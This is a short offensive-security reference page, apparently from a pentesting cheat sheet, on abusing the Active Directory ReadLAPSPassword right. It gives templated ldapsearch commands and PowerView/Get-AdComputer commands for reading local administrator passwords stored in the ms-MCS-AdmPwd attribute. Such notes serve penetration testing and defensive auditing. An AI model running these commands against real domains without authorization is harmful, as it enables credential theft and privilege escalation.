---
title: "ReadLAPSPassword"
date: 2024-7-30
tags: ["ReadLAPSPassword", "active driectory", "ad", "Windows", "LAPS"]
---

---
### Abuse #1: Read LAPS Password

{{< tab set1 tab1 active >}}Linux{{< /tab >}}
{{< tab set1 tab2 >}}Windows{{< /tab >}}
{{< tabcontent set1 tab1 >}}

<div>

```bash
ldapsearch -h 10.10.11.10 -b 'DC=<,example>,DC=<com>' -x -D <USER>@<TARGET> -w <PASSWORD> "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
```

</div>

{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

#### 1. Import PowerView.ps1

<div>

```powershell
. .\PowerView.ps1
```

</div>

#### 2. Create cred object (runas) \[optional\]

<div>

```powershell
$username = "<DOMAIN>\<USER>"
```

```powershell
$password = ConvertTo-SecureString <PASSWORD> -AsPlainText -Force
```

```powershell
$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password
```

</div>

#### 3. Read LAPS password

<div>

```powershell
Get-AdComputer -Filter * -Properties ms-Mcs-AdmPwd -Credential $cred
```

</div>

{{< /tabcontent >}}

<br>